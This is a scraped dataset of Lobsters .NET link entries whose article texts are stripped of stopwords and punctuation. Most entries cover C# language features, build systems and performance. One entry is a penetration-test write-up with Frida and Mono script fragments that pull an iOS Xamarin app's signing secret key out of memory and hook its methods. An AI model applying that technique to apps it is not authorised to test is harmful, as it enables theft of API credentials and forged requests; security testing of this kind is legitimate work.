137,Lobsters,dotnet,"C#, F#, .NET programming",C# 8 Nullable Reference Types Update,https://www.infoq.com/news/2019/06/CSharp-8-More-Nullable-Reference/,c nullable reference type update,open question declarative argument null check simplified parameter null validation,work continues nullable refence type c revealing edge case need addressed final release new opportunity reducing amount boilerplate developer write open question nullable reference type take precedence maybenull notnull allownull notnull allowed value type change top level nullability warning ref argument always assumed assigned conversion preserve nullable state member support var open issue along line would allow var x deconstruction permit forbid typeof string given never honor nullable annotation compute nullable annotation flow analysis use context result dynamic invocation treated nonnull generally outside scope static analysis question answered highlight may affect code written nullability conditional invocation x f always nullable throw statement throw expression yield warning operand may null nullability warning unreachable code nullability anonymous type part inferred signature declarative argument null check one hole nullable reference type merely suggestion far compiler concerned even mark parameter nonnullable nothing stop someone accidentally passing null especially using reflection dynamic mean still need add null argument check beginning function simplified parameter null validation able tell compiler create null check two version syntax proposed void insert string void insert string case bang operator used either type name parameter name argument first version implementation detail function part method signature argument second version consistent nullable version void insert string perhaps method signature significant part signature applied interface method well open question inheritance overriding method another question implemented option include c emits check inline il c emits call helper method il c emits tag allowing jit process decide perform check another question happens type nullable int null check desired supported may result contradiction signature void insert int yet discussed using attribute notnull instead custom syntax verbose would set precedent form declarative parameter checking
138,Lobsters,dotnet,"C#, F#, .NET programming",Replacing a live system is really hard,https://aras-p.info/blog/2019/06/21/Replacing-a-live-system-is-really-hard/,replacing live system really hard,two year build team replacing system evermoving product really really hard keep change old stuff everything keep working time may jam c project hackweek unity hackweek jam jamplus rider actual work start gradle starting take advantage c thing bee lucasmeijer one one jam switched tundra backend ninja backend tundra fork build system la carte current state previous blog post project tiny,turn two year build team post almost end time started new thing new work area wrapping leftover build team work speak wanted write one particular aspect build system work took almost three year total three year really long time long took u switch build system previously build system turn replacing system evermoving product really really really hard sometimes see whenever people dream new fancier better system think making new system work go experience build system also handful occasion addition developing new thing also cover busy new stuff keep change old stuff build system people keep adding new file library built tweak compiler flag change preprocessor defines update sdkcompiler version area old system live used changed time maybe data old system still produced someone transition new system rolled way everything keep working time hundred developer codebase lot automated process running build test packaging etc everyone loses even day work due messup massive cost really risky change rolled incrementally somehow rolled everyone large issue found fixed story know chosen approach good bad seems worked fine may jam c project hackweek unity hackweek one project instead jam syntax describe build c short video video used jambased build system called jamplus build everything inside unity since overall whole setup look like actual build engine jamexe piece know parse jam file describe build find thing need updated order build something execute build command parallel possible jamplus bunch rule written top combination jam lua language helper utility like finding c compiler describing basic structure cc program etc jamplus also generate ide project file visual studio xcode bunch jam file describe piece platform unity simple thing like list c file compile compiler flag involved thing mostly generating code build time jam language syntax compact also interesting example need whitespace token yes mean space every semicolon otherwise lot confusing message get random example found rule convertfile cmd dest sourceinput generatedinput input sourceinput ghlslang generatedinput generatedinput ghlslang dest dest ghlslang makelocate sourceinput searchsource makelocate generatedinput locatetarget generatedinput makelocate dest locatetarget dest clean clean dest usefilecache dest depends dest sourceinput generatedinput cmd dest sourceinput generatedinput scancontents dest return dest hackweek embed c via mono directly jamexe make able run c code describe everything build instead parsing jam language file also wrote converted jam language c language sound bit crazy eh embedded c piece software written jam file build code also jamplus rule get turned c file functionally nothing else change autogenerated c course look much better fact point verbose original jam code static jamlist convertfile jamlist cmd jamlist dest jamlist sourceinput jamlist generatedinput dest destclone generatedinput generatedinputclone varsinputassign sourceinputsetgrist hlslang generatedinputassign generatedinputsetgrist hlslang destassign destsetgrist hlslang jambasemakelocate sourceinput varssearchsource jambasemakelocate generatedinputsetdirectory combine varslocatetarget generatedinputgetdirectory jambasemakelocate destsetdirectory combine varslocatetarget destgetdirectory jambaseactionclean clean dest invokejamrule usefilecache dest depends dest jamlist sourceinput generatedinput invokejamrule cmd dest jamlist sourceinput generatedinput invokejamrule scancontents dest return destclone however cleanup good ides get legible c fairly quickly eventually static void convertfile string cmd npath dest npath sourceinput npath generatedinput invokejamaction cmd dest jamlist sourceinput generatedinput tell jam generated bisonflex file includes original tempate grammar file meaning include whatever regular c header include detect needed rebuilds includes dest sourceinput depends dest jamlist sourceinput generatedinput need dest buildzipsinstanceflexandbisonartifactversionfile actual work start hackweeks lot fun one get impressive result interesting part project however actual production embed mono jam write language converter kinda work nearly enough actually work etc etc anyway couple month hackweek experiment previous effort move jamjamplus gradle canceled new jam c plan greenlit took february next year jam build engine build code written c landed everyone developing unity test separate branch track mainline build farm two build first regular jam build jam build code dumped whole jam build graph structure second one jam code automatically converted c dumped whole jam build graph structure checking two build graph identical every build targetplatform developer unity optin new jam build code month catch possible issue especially one testedcovered build farm eg visual studio project file still generated like final rollout jam file gone jamcs file also tool would help anyone longlived branch want land mainline might changed build code jam language c rollout change would nowhere merge give old jam file get converted c file back tooling case february rolled removal old jam file horrible looking autoconverted c build code landed starting take advantage c thing autoconvertedjamtoc arguably much better verbose actually kinda harder read upside statically typed programming language great ides debugger data type besides list string lot people inside unity know c whereas know jam exactly common started writing new c based apis express build program rule call bee ask lucasmeijer name also rewriting ide project file generation luabased one jamplus well c blog post relating visual studio project file one one might time course point build code still used old jamplusbutnowc apis express thing need built began taking piece converting use new bee build apis took much longer initially expected primarily omg would believe platform build code might arcane compiler flag used one remembers know might break change file copied ran strange tool signed triplicate sent sent back queried lost found subjected public inquiry lost finally buried soft peat three month recycled firelighter know lot going inside every nontrivial build platform build target also lot work build area improving ux error message color developing system downloading binary artifact part build upgrading packaging compiler toolchains experimenting ninja build backend instead jam later optimizing codebase build time general improving project file jam switched tundra backend experiment ninja backend settled upon tundra fork replaced jam build backend change fairly hard verify work exactly tundra work exactly jam one might think build system rule build dependency graph execute build action bit complexicated nice paper microsoft research build system la carte categorizes build system type dependency support static v dynamic scheduling approach early cutoff support etc specifically tundra scheduler different think restarting one per paper whereas jam topological practice least codebase mean tundra often rebuilds le thing compared jam especially thing involve file generated build time since order build step even amount different tundra jam could build simple validation suite like build everything compare exact step rely automated buildstests already product also volunteer developer inside unity try tundra locally since january people could optin tundra adding tiny local environment change report finding started handful people coming month grew several dozen late may got turned default still ability optout everyone mac next month everyone got tundra switched time later remains jamexe got actually removed current state today main code repository jamexe long gone almost remains jamplusconverted c code gone compared build state three year ago lot nice build related tool built wrote previous blog post general think various aspect build performance reliability ux workflow improved side effect also fairly nice build system bee use build thing outside main code repository also used build various external library use various pluginspackages think even thing like project tiny use building actual final game code nice oh geez also took lot time hence blog post title
139,Lobsters,dotnet,"C#, F#, .NET programming",Math.Round opens the browser print dialog,https://github.com/dotnet/try/issues/290,mathround open browser print dialog,join github today sign reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign perform action time signed another tab window reload refresh session signed another tab window reload refresh session
140,Lobsters,dotnet,"C#, F#, .NET programming",C# 8 More Small Features,https://www.infoq.com/news/2019/06/CSharp-8-More-Small/,c small feature,target typed expression targettyped switch expression proposal allow default deconstruction proposal obsolete property proposal readonly member structs marking entire struct readonly readonly instance method pure attribute,though c supposed released year roadmap c beginning formed microsoft continuing approve feature next release target typed expression say type b c b c subtypes use following statement compiler determine type return righthand side b c x b c switch b b b c c c throw new systemexception normally fixing requires adding cast b c x b c targettyped switch expression proposal case compiler allowed use lefthand side statement determine type righthand side b c return feature would also work return statement return b c var var b c currently pattern matching version example planned c two slated allow default deconstruction small feature allow default keyword used initializing tuples proposal int string default default obsolete property unlike visual basic c mark individual getters setter obsolete instead property whole marked proposal rectifies situation understand important consider cory nelson comment found wishing week ago trying clean code used bunch getset property one readonly ctorinitialized record april feature moved c c readonly member structs assigned readonly field used parameter method structs minor performance problem call method struct compiler make defensive copy first usually expensive enough cause problem used tight loop small inefficiency add fully immutable structs avoided marking entire struct readonly however many structs mutable performance reason readonly instance method proposal developer able mark individual method readonly indicates compiler defensive copy necessary value altered different pure attribute readonly method visible sideeffects long alter value struct getters autoimplemented property considered readonly automatically case setter also marked readonly example property value stored dictionary rather directly struct current proposal reference type class interface supported feature reason threefold performancerelated advantage readonly keyword mean state changed merely field object directly altered extension readonly struct equivalent readonly class
142,Lobsters,dotnet,"C#, F#, .NET programming","Faster lookups, insertions, and in-order traversal than a red-black or AVL tree",https://neosmart.net/blog/2019/sorted-list-vs-binary-search-tree/,faster lookup insertion inorder traversal redblack avl tree,github nugetorg,neosmart technology pleased announce immediate availability open source neosmartcollections librarypackage specialized container collection designed eke performance beyond available typical library framework purposely optimizing specific common use case cost pretty much everything else many regard data structurescontainerscollections ship pretty much given framework standard library study compromise language framework developer idea sort data user throw collection order clue whether malicious third party would ultimately liberty insert carefully crafted value container even general ratio read writes would look like shipped code must resilient fairly performant free obvious pathological case catastrophic memory computation complexity dependable language framework developer forced make choice necessarily align use case even attempting identify alternative data structure could write use need often presented theoretical 𝒪 number necessarily apply even relevance real world algorithm thrown window horrible 𝒪 algorithm data structure may well best friend reasonably confine certain subset condition input value without delving processor instruction pipeline execution unit spatial temporal data locality branch prediction simd processing brings u neosmartcollectionssortedlist star today neosmartcollections nuget package release developer learned reach library equivalent std set need keep ordered list value around deduplication querying whether std set systemcollectionssortedset implementation typically redandblack tree type selfbalancing binary search tree guarantee 𝒪 log n lookup without much memory overhead inserttime computation 𝒪 log n extremely misleading binary search tree naturally implies certain amount memory fragmentation selfbalancing binarysearch tree automatically incurs fair bit work insertion guarantee lookup time data contiguously allocated tree implementation particularly cache friendly balancing also mean sometimes pull data want need cache evicting data might read next first blush sound downright pleasurable compared cost store alwayssortedatrest data list needing shift average element insert place item correct location possibly needing copy entire content list array new memory location capacity exceeded larger backing array needed also fairly easy see populated sorted array offer preferable realworld lookup time better data locality cache friendliness compared average binary search tree still technically making theoretical 𝒪 log n guarantee paper world unknown anything happen data need load data need insert often pretty good idea dis order data arrive generally know whether likely read write maybe even writes occur binary tree variant may offer better insertion time dealing constant stream new element particular order real world often chunk n element insert element arriving inorder even reasonably close past certain point scenario certainly familiar anyone developed application mutable state loadedrestored disk need alwayssorted collection initial data loaded whatever input source new data generally arrives inorder except sometimes eventsitems arriving close temporal proximity one another reach outoforder due queuing mechanism guarantee fifo semantics maybe event queue guarantee exactlyonce semantics either message delivered twice case congestion network delay perhaps may need deduplicate data arrives within window maybe whatever case find dealing data arrives moreorless order sorted list match insertion performance rb avl tree value inserted strictly greater equal want previous maximum value collection even guarantee constanttime 𝒪 general monotonic trend hold even need insert outoforder data need shuffle around recently arrived item inserted element inserted word even going get tough tough get going 𝒪 n insertion reason net bcl includes sortedlist k v addition redandblack treebacked sorteddictionary k v sometimes listvectorarray faster tree even sorted data unfortunately equivalent systemcollectionssortedlist structure found net framework upcoming net core ok write even include nice optimization even specific access pattern sortedlist k v good chance needed data structure optimized particular access pattern already written using happily ever since case read neosmartcollections provides missing piece sortedlist uniquesortedlist offering faster insertion faster lookup systemcollections provided condition met sortedset give option keeping duplicate equivalent around collection sortedlist handle without problem need deduplicate input uniquesortedlist friend cost incurred deduplication neosmartcollections released open source mit license contribution encouraged welcome source available github package binary symbol available nugetorg neosmartcollections includes previously mentioned sortedlist uniquesortedlist class well handy data structure textbook goto collection storing collection tend come handy perform really well real world count
143,Lobsters,dotnet,"C#, F#, .NET programming","TPL Dataflow in .Net Core, in Depth (Part 2/2)",https://www.blinkingcaret.com/2019/06/05/tpl-dataflow-in-net-core-in-depth-part-2/,tpl dataflow net core depth part,buffering part bufferblock manual use bufferblock cancellation token broadcastblock writeonceblock grouping batchblock joinblock batchedjoinblock conclusion,second blog post dataflow library find first one unfamiliar dataflow library allows write concurrent code without use lowlevel synchronization mechanism lock blog post look buffering grouping dataflow block buffering type dataflow block discussing point part called execution dataflow block apart form actionblock transformblock tin tout also transformmanyblock tin tout similar transform block difference instead output single instance tout ienumerable tout two type dataflow block called buffering grouping block section looking buffering block three bufferblock broadcastblock writeonceblock bufferblock typical usage buffer block hold message consumer ready receive create buffer block hold message type request var bufferblock new bufferblock request new dataflowblockoptions boundedcapacity since execution block mentioned previously buffering mechanism builtin use boundedcapacity property executiondataflowblockoptions hard find example using bufferblock feel bit convoluted least one scenario useful several source block eg transform block linked buffer block linked several target block eg action block target block configured way distribute load multiple producer multiple consumer way require link every producer every consumer look like visually also setup add producer andor consumer without deal linking together simply link new producer buffer block link buffer block new consumer manual use bufferblock one way use buffer block take advantage fact operation dataflow block threadsafe use create producerconsumer pattern imagine thread producing value want handled another thread want deal issue shared data structure eg list even threadsafe collection like concurrentbag two thread case wondering approach could superior using member systemcollectionsconcurrent eg concurrentbag even thought member systemcollectionconcurrent thread safe builtin mechanism wait new value arrive probably want consumer example illustrates using buffer block make scenario simple var bufferblock new bufferblock int taskrun async bufferblockpost bufferblockpost await taskdelay consumer idle second freeing resource thread bufferblockpost bufferblockpost bufferblockcomplete cause outputavailableasync return false var consumer taskrun async await bufferblockoutputavailableasync block data arrives complete called var data bufferblockreceive consolewriteline received data consumerwait using approach lock convoluted way dealing waiting data arrive consumer wait data arrive calling outputavailableasync buffer block asynchronously return true data arrives false complete called buffer block also overload pas cancellation token parameter usually see example buffer block explicitly shared like instead producer thread use itargetblock consumer thread isourceblock portion bufferblock like var bufferblock new bufferblock int itargetblock int producer bufferblock isourceblock int consumer bufferblock taskrun async producerpost producerpost await taskdelay consumer idle second freeing resource thread producerpost producerpost producercomplete cause outputavailableasync return false var consumertask taskrun async await consumeroutputavailableasync block data arrives complete called var data consumerreceive consolewriteline received data consumertaskwait broadcastblock writeonceblock two type buffering dataflow block writeonceblock broadcastblock broadcast block send message receives block link link added block broadcast block hold value send new block put concrete term imagine broadcast block linked block broadcast block receives value x eg someone call post value end sent block new link created broadcast block block b block b immediately sent value x ie broadcast block hold value receives give block linked receives new value even link created value received broadcast block soon broadcast block receives new value discard old one usually would use broadcast block want send value several dataflow block without actually sending value one individually broadcast block also accepts parameter constructor cloning function broadcastblock func cloningfunction allows create copy object want broadcast might necessary block broadcast block link mutate value receive case pas null cloning function type buffering block writeonceblock type block name suggests accept one value reject subsequent one sometimes used scenario linked block expects cloning function null required passed parameter constructor useful scenario writeonceblock one multiple block competing want result one quickest look like example depicted input go broadcast block sent two transform block running two competing algorithm first one produce value value accepted write block slowest one rejected get quickest value write block look like code task toutput getvaluefromfastest tinput toutput tinput input func tinput task toutput func tinput task toutput var broadcastblock new broadcastblock tinput null var new transformblock tinput toutput var new transformblock tinput toutput broadcastblocklinkto broadcastblocklinkto var writeonceblock new writeonceblock toutput null writeonceblock writeonceblock broadcastblockpost input return writeonceblockreceiveasync grouping last type dataflow block called grouping block type bactchblock joinblock batchjoinblock batchblock common grouping block batchblock constructor expects int parameter set batch size example would create batch block batch size measure var batchblock new batchblock measure batchsize used type measure example imagine common use type block accumulate certain number value example sensor take action certain number batch size reached link batch block another dataflow block dataflow block receive ienumerable batch block type case ienumerable measure hypothetical example print average last measurement var batchblock new batchblock measure var actionblock new actionblock ienumerable measure measure consolewriteline average value measuresaverage mvalue batchblocklinkto actionblock new dataflowlinkoptions propagatecompletion true batchblockpost new measure value batchblockpost new measure value batchblockpost new measure value batchblockpost new measure value batchblockpost new measure value batchblockcomplete description made grouping block work pretty straightforward however grouping block two mode operation greedy nongreedy default greedy following two example illustrates work var new bufferblock int null var new bufferblock int null var batchblock new batchblock int new groupingdataflowblockoptions greedy true default omit batchblock batchblock var actionblock new actionblock ienumerable int value consolewriteline average value valuesaverage batchblocklinkto actionblock threadsleep time value propagate defining batch value linking two producer producer buffer block using solely illustrate batch block behaves multiple block linked send value twice send value twice run snippet action block output average value average value surprising sent two time enough fill batch average send two time make batch happens set greedy flag false var batchblock new batchblock int new groupingdataflowblockoptions greedy false get output average value average value happening batch block greedy mode create batch using value different source even though sent twice first value reserved batch send value thorough enter batch making batch average happens two value data flow block linked nongreedy batch block batch size batch block produce value soon batchsizenumber value different data flow block linked nongreedy batch block defined batch block larger number data flow block linked never produce value joinblock join block offer two variant one join block two target linked two dataflow block another offer three joinblock joinblock operate identically greedy mode default produce tuple tupple tupple receive least one value target property expose example var new bufferblock int var new bufferblock int var joinblock new joinblock int int var actionblock new actionblock tuple int int v var v consolewriteline joinblocklinkto actionblock example soon emitted least one value join block produce tuple int int value nongreedy mode thing get little involved join block reserve value target value value reserved consumed data flow block example illustrates var new bufferblock int var new bufferblock int var sinkactionblock new actionblock int value consolewriteline action block consumed value var joinblock new joinblock int int new groupingdataflowblockoptions greedy false var printtoconsoleactionblock new actionblock tuple int int value consolewriteline received value join block joinblocklinkto printtoconsoleactionblock taskdelay wait time join block consume value sinkactionblock join block nongreedy second value go sink action block value never consumed join block output example received value join block action block consumed illustrates join block greedy mode consume message message available target output would look like greedy true received value join block received value join block batchedjoinblock finally batched join block event though name suggests produce batch output join block reality dataflow block behaves join block produce tuple eg tuple joinblock one might think batched join block produce collection tuples eg ienumerable tuple join block actually result instead tuple ilist ilist batch size sum element ilist ilist either list empty also batched join block nongreedy mode example make thing clearer var batchedjoinblock new batchedjoinblock int int nongreedy supported var printtoconsoleactionblock new actionblock tuple ilist int ilist int result foreach var consolewriteline foreach var consolewriteline consolewriteline batchedjoinblocklinkto printtoconsoleactionblock creating batched join block batch size three sending value one value make first batch send three value time one ouput see two batch separated dataflow block systemthreadingtasksdataflow library conclusion dataflow library allows creating concurrent code without requiring use lowlevel synchronization mechanism lock easy reason lends well represented graphically share idiosyncrasy hopefully blog post help related
144,Lobsters,dotnet,"C#, F#, .NET programming",Candidate Features For C# 9,https://www.c-sharpcorner.com/article/candidate-features-for-c-sharp-9/,candidate feature c,record patternbased withexpression example record f f scala kotlin type class mads torgersen example dictionary literal params span allow noarg constructor field initializers struct declaration stackoverflow example nativesized number type fixed sized buffer string literal based summary,long road c already begun first article world c candidate feature completed reading article hopefully better prepared new c challenge meet future article based record patternbased withexpression waiting long time feature record lightweight immutable type nominally typed might method property operator etc allow compare structural equality also record property readonly default record value type reference type example public class double x double double z public class demo public void createpoint var p new code converted public class private readonly double x kbackingfield private readonly double kbackingfield private readonly double z kbackingfield public double x get return x kbackingfield public double get return kbackingfield public double z get return z kbackingfield public double x double double z x kbackingfield x kbackingfield z kbackingfield z public bool equal value return x valuex valuey z valuez public override bool equal object value return value null equal public override int gethashcode return equalitycomparer double defaultgethashcode x equalitycomparer double defaultgethashcode equalitycomparer double defaultgethashcode z using record public class demo public void createpoint new record proposal introduced new proposed feature withexpression use together like following var x created new point like existing one value x changed future also working well pattern matching cover topic separate article record f copy f msdn example type x float float z float let evaluatepoint point match point x z printfn point origin x xval z printfn point xaxis value f xval x yval z printfn point yaxis value f yval x z zval printfn point zaxis value f zval x xval yval z zval printfn point f f f xval yval zval evaluatepoint x z evaluatepoint x z evaluatepoint x z output code follows point origin point xaxis value point first question come mind need record better use struct answer question posted quote reddit structs thing discipline implement nt make immutable nt implement value equality logic nt make comparable nt lose almost benefit compiler nt enforce constraint record type implemented compiler mean meet criterion ca nt get wrong save lot boilerplate eliminate entire class potential bug moreover feature existed decade f language like scala kotlin similar concept example language support constructor record f type greeter name string member thissayhi printfn hi name scala class greeter name string def sayhi println hi name kotlin class greeter val name string fun sayhi println hi name meanwhile still writing c long code public class greeter private readonly string name public greeter string name name name public void greet consolewriteline hello name feature done reduce c code public class greeter name string public void greet consolewriteline hello name le code love type class feature inspired haskell one favorite feature said two year ago old article c going implement functional programming concept one fp concept functional programming type class allow add set operation type implement since implementation done elsewhere form polymorphism lot flexible adhoc classical kind objectoriented programming language type class c interface serve similar purpose way work somewhat different case type class straightforward use working fixed type rather piece inheritance hierarchy feature originally introduced together extending everything feature combine shown mads torgersen example quoted text official proposal general shape declaration much like interface declaration except define almost kind member including static member implemented extension used type certain place haskell type class example class eq bool bool eq class name operation class type instance class eq haskell example generic c interface interface eq bool equal b bool notequal b haskell example type class c shape new distinctive keyword type class shape eq bool equal b bool notequal b example show syntax similarity interface type class interface num add b mult b neg struct numint num int public int add int int b b public int mult int int b b public int neg int c type class concept c shape num add b mult b neg instance numint num int int add int int b b int mult int int b b int neg int mads torgersen example important information shape type instead primary purpose shape used generic constraint limiting type argument right shape allowing body generic declaration make use shape public shape sgroup static operator static zero get declaration say type sgroup implement operator zero static property public extension intgroup int sgroup int public static int zero extension public static addall t sgroup var result tzero foreach var t result return result let u call addall method ints int number writeline addall number dictionary literal introduces simpler syntax create initialized dictionary tkey tvalue object without specify either dictionary type name type parameter type parameter dictionary inferred using existing rule used array type inference var x new dictionary string int foo bar var x foo bar proposal make work dictionary c simpler removing redundant code addition worth mention similar dictionarysyntax used programming language like f swift params span allows params syntax use span help implement params parameterpassing without heap allocation feature could make use params method much efficient new syntax could like void foo params span int value allow noarg constructor field initializers struct declaration noarg constructor field initializers struct declaration allowed c c limitation removed stackoverflow example public struct rational private long numerator private long denominator public rational long num long denom public rational long num numerator num denominator public rational numerator denominator quoted text official proposal halofour commented nov proposal proposal seek remove language limitation prevents declaring default constructor clr already fully support structs default constructor c support using entirely unrelated constant could nt related constant given feature already exists clr level behaves differently nativesized number type introduces new set native type nint nuint nfloat etc n native design new data type planned allow one c source file use naturally storage depending host platform type compilation setting native type depending o nint nativeint take byte compile bit host nint nativeint take byte compile bit host compilation setting similar concept exists already xamarin fixed sized buffer provide generalpurpose safe mechanism declaring fixed sized buffer c language motivation today user create fixedsized buffer unsafecontext however requires user deal pointer manually perform bound check support limited set type bool byte char short int long sbyte ushort uint ulong float double feature make fixedsized buffer safe example one would declare safe fixedsized buffer via following public fixed dxgirgb gammacurve declaration would get translated internal representation compiler similar following fixedbuffer typeof dxgirgb public buffer dxgirgb gammacurve compilergenerated unsafevaluetype structlayout layoutkindsequential pack struct buffer private private private public ref int index ref uint index ref refadd ref index throw new indexoutofrange string literal defining new type like test string based problem interface void int interface void short interface override void int interface void base tricky part short int applicable lookup rule also say find applicable member derived interface ignore member le derived interface combined rule override found lookup looking first thing find applicable meaning appear list applicable member since concluded previous meeting implementation must exist target type applicable member call base written error implementation information http http summary read first c candidate feature seen many new feature inspired programming language programming paradigm selfinnovation good thing candidate feature well accepted among community
145,Lobsters,dotnet,"C#, F#, .NET programming",Hacking IOS Xamarin apps with Frida,https://orangewirelabs.wordpress.com/2019/05/30/hacking-ios-xamarin-apps-with-frida/,hacking io xamarin apps frida,method instantiating config class method intercepting c method result http infocenterarmcomhelpindexjsp research burp integration like,recent test tasked breaking api used io app usual thing setting fake wireless ap transparently piping web traffic burp straight away noticed app signing request amazonstyle signing process could see request burp replay alter api accept anything signed extracting ipa file resulted whole folder full looked like net dll file associated aotdata file digging showed app based xamarin framework totally normal something panic point thought hey neat throw dnspy read nicely formatted code greeted nothing unimplemented empty header class method turn apple allow kind exciting emulated interpreted stuff platform xamarin based net would fall category get round code compiled ahead time aot dumped bunch file figure decompile mono runtime performs magic load memory demand redirect function call mean two thing probably way beyond arm reverse engineering skill frida cant see function run fridatrace tool point took step back actually redefine problem focus bit decided ultimate aim find value used sign request android version could probably reverse engineer signing process c header mentioned turned useful eventually digging found class contained field called accessid secretkey class called appsettings however werent set initialisation time value werent c part app read also two method called getaccessid getsecretkey probably needed two obvious path take instantiate copy setting class call get method two field wanted read intercept call method steal result return value managed note anyone else stuck situation whole bunch really useful tool dealing mono code via frida recommend installing method instantiating config class first step install tool make sure work deploy frida rooted iphone bundle gadget repackagedsigned ipa first plenty tutorial internet wont repeat going inject script app instantiates class want call method need wrapper script const fridainject require fridainject const frida require frida async function main const device await fridagetusbdevice fridainject name thingy device device clean true script consolelog let break stuff onattach session consolelog attached process ondetach session reason consolelog detached process onload script consolelog script loaded onunload script consolelog script unloaded main going walk writing script script going find c assembly contain class want use find method class want use within assembly instantiate appsettings class run getaccessid getsecretkey method new object unbox structs method returned go unboxing thing encounter anyone thats done really similar programming c using reflection first find reference class constructor create object call constructor etc first step write helper find reference class get used lot worth spending time function getclass name var k monoapihelperassemblyforeach function assemb var image monoapimonoassemblygetimage assemb var klass monoapihelperclassfromname image name klass k klass return k return pointer given class found use like var appvalueclass getclass comthingyiosplatformspecificappsettings start creating object type start need reference current appdomain everything create within think way segmenting c apps luckily mono runtime extension frida mono tool library provides method const domain monoapimonodomainget create empty object type var iosappsettingsobj monoapihelperobjectnew appvalueclass domain variable pointer newly allocated object note run constructor method likely nothing initialised field want empty need run ctor method get object ready use referring decompiled c code see iosappsettings class contstructor requires instance pluginsettingssettingsimplementation run go get reference class like create empty one run constructor var pluginklass getclass pluginsettingssettingsimplementation var pluginobject monoapihelperobjectnew pluginklass domain var pluginconstructor monoapihelperclassgetmethodfromname pluginklass ctor var result monoapihelperruntimeinvoke pluginconstructor pluginobject null done pluginobject ready stuck constructor iosappsettings object get reference constructor apply object created call plugin object also noticed method called loadapplication look important let find run var appvalconstructor monoapihelperclassgetmethodfromname appvalueclass ctor var monoapihelperruntimeinvoke appvalconstructor iosappvalueobj pluginobject var method monoapihelperclassgetmethodfromname k loadapplication var result monoapihelperruntimeinvoke method iosappsettingsobj null point result contain fully instantiated loaded copy app setting field interested try read first thing get list field class var field monoapihelperclassgetfields appvalueclass also need reference systemguid tostring class var systemguidklass getclass systemguid var guidtostring monoapihelperclassgetmethodfromname systemguidklass tostring need iterate read value field name accessid secretkey pull value unbox resulting value call tostring resulting guid object print hard part spent day wondering result tostring call looked like pointer value didnt realise systemguid actually struct object order return mono box object represented pointer following pointer gave u actual pointer call tostring code look little like fieldsforeach function f var fr monoapihelperfieldgetvalueobject f result var v non var fn monoapihelperfieldgetname f fn accessid fn secretkey consolelog pulling fn var unboxfr monoapimonoobjectunbox fr var r monoapihelperruntimeinvoke guidtostring unboxfr null v r else v fr consolelog fn v print object field hopefully include accessid secretkey field name thingyios version language engb region gb pulling accessid accessid xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pulling secretkey secretkey xxxxxxxxxxxxxxxxxxxxxxxxxxxxx value wasnt fun neat concept demonstrated script find read c definition object find create run method return result method intercepting c method result start post mentioned couldnt seem run fridatrace c method exposed aot compiled code research managed find method intercepting c method using main frida tool general plan find method name class want trace c header mangle match odd format aot compilation process applies find reference function memory using frida write interceptor function catch function called grab response first step want find getsecretkey method comthingyiosplatformspecificiossettingsvalues class aot compiler run creates c method every c objectmethod compilation method used mono runtime look method procedure link table plt load corresponding code using dynamic loader method name get messed put plt example comthingyiosplatformspecificiossettingsvaluesgetsecretkey becomes comthingyiosplatformspecificiossettingsvaluesgetsecretkey hunt method name using fridacli root phoenix fr frida worldclass dynamic instrumentation toolkit command help display help system object display information object exitquit exit info http wwwfridaredocshome io device thingy debugsymbolfindfunctionsmatching comthingyiosplatformspecific io device thingy debugsymbolfindfunctionsmatching search function using wildcards response pointer function converted name piping map call io device thingy debugsymbolfindfunctionsmatching comthingyiosplatformspecific map debugsymbolfromaddress join n thingyios comthingyiosplatformspecificiosappsettingsgetaccesskey thingyios comthingyiosplatformspecificiosappsettingsgetsecretkey notice getaccessid getsecretkey method bingo know full name method write interceptor tool var funcptrs debugsymbolfindfunctionsnamed comthingyiosplatformspecificiosappsettingsgetsecretkey var funcptr funcptrs interceptorattach funcptr onenter function args consolelog key called args args onleave function ret var final consolelog secret key final run frida u f thingy l keyjs nopause notice f full app name display name want start script app start kill first phone file containing script make sure app start frida attache app start phone script run search function trap wait called frida worldclass dynamic instrumentation toolkit command help display help system object display information object exitquit exit info http spawned thingy resuming main thread io device thingy key called args key done access id key called args key done secret key io device thingy here fun part return value ret onleave function contains half guid mangled format think guid stored pair value internally examine register call end see half register pc sp etc reading documentation show register used parameter passing result returning register http infocenterarmcomhelpindexjsp cant quite see decode value guid automatically easy enough enough thinking actual test value quite obviously one returned method counting win method used track intercept c call application make need figure name first reading value argument response challenge though method return object likely return pointer follow monoobject represents need start reading mono source code figure format struct pull data managed simple thing like reading name class method memory challenge bigger object research burp integration someone created burp plugin called brida allows call native method burp data could really useful application sign request like example possible reverse engineer signing process may possible bundle burp request object pas signing tool app get phone send challenge getting brida spot c method plt frida see use fridatrace find cant probably possible use object creation stuff ie create whatever request object app us fill data dont know garbage collection work likely app die burp thrash request like like loading
146,Lobsters,dotnet,"C#, F#, .NET programming","5M bid request/s, 2ms Max Response Time - The Road to Damascus",https://github.com/eloraiby/fs-pacer/blob/master/fs-pacer.md,bid request max response time road damascus,wael el oraiby disclaimer samsung adsadgear libuv warning bid request max response time road damascus welcome digitalonline advertisement business secondprice auction pacer atomics explode libck lockfree data structure atomic kernel vm note irony fate state fire minion work progress actor message problem shared variable erlang client actor processor watcher profile pipeline code c thy shall receive libuv pony note conclusion typical,copyright c wael el oraiby right reserved disclaimer opinion work samsung adsadgear online ad platformexchange sell ad internet browser mobile tv typical pacer node later system handle million request one objective make scalable multiple core network card thought rewrite pacer f coreclr since offer stronger guarantee strong type system reliable package importantly async framework surprise async socket framework relies corefx far behind linux term sheer throughput solution marshal call f libuv achieve million least bid request thread solution scale coresnics warning war story bid request max response time road damascus worst case bid request second packet hammering single node served le node virtual core server least gigabit ethernet card running linux system make fast decision whether spends money show ad bidding strategy clear hopefully bug free otherwise single node end overspending send company bankrupt welcome digitalonline advertisement business fire browser open mobile app even smart tv ad space send request online advertisement platform like samsung google facebook likely advertisement platform act exchange although necessarily run auction fanning request advertiser ask bid one bid win space put ad side note samsung adsadgear run secondprice auction case winner pay second highest price depending close node exchange time decide usually round trip like google give journey ad bid request grows go different phase filter augmenting amount information hold looking car lately hop within system database microservice queried database ordinary sql database rather custom tailored one built low latency high throughput end journey lie special microservice pacer pacer pacer microservice governing police end line duty ensure advertisement campaign go overbudget try best spread spending across lifetime campaign strategy heuristic spread budget across time outside scope article range however simple complicated complicated complex focus architecture underlying optimization work atomics explode early pacer written c using infamously complicated libck lockfree data structure lockfree data structure algorithm ensure least one thread keep going rely atomic operation functionality making fun think implement scratch said architecture old code make highly susceptible race condition bad day ad campaign misbehave external state update making use libck ticking atomic bomb hardly seen real excuse use lockfree data structure unless low level kernel stuff concurrent renderer seen engineered nt really need custom vm infrastructure read warning twice compare 